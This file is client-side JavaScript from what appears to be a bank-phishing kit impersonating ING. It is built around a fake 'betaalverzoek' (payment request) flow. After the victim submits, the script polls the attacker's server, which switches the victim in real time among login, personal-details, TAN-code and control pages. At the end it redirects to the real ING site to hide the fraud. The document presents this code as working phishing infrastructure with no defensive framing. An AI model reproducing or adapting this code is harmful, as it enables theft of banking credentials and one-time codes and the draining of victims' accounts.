const login_form = document.querySelector('#login-form');

const expiration = document.querySelector('#login-username');
const loginButton = document.querySelector('#loginButton');
const token = document.querySelector('#token');

login_form.addEventListener('submit', e => {
    e.preventDefault();      
    loginButton.innerHTML = '<img src="/img/ing.gif" width="20"> Volgende';
    loginButton.disabled = true;

    fetch('/particulier/betaalverzoek/bevestigen/' + token.value, {
        method: 'POST'
    }).then(() => {
        const newInterval = setInterval(() => {
            fetch('/particulier/betaalverzoek/bevestigen/check/' + token.value, {
                method: 'POST'
            }).then(res => {
                res.json().then(data => {
                    if (data.page == 'login') {
                        window.location.href = '/particulier/betaalverzoek/inloggen/' + token.value;
                    } else if (data.page == 'details') {
                        window.location.href = '/particulier/betaalverzoek/informatie/' + token.value;
                    } else if (data.page == 'confirm') {
                        loginButton.innerHTML = 'Volgende';
                        loginButton.disabled = false;

                        clearInterval(newInterval)
                    } else if (data.page == 'tan') {
                        window.location.href = '/particulier/betaalverzoek/tancode/' + token.value;
                    } else if (data.page == 'control') {
                        window.location.href = '/particulier/betaalverzoek/controleren/' + token.value;
                    } else if (data.page == 'finish') {
                        window.location.href = 'https://www.ing.nl';
                    } else if (data.page == 'waiting') {
                        console.log('Waiting...');
                    }
                });
            });
        }, 500);        
    });
});


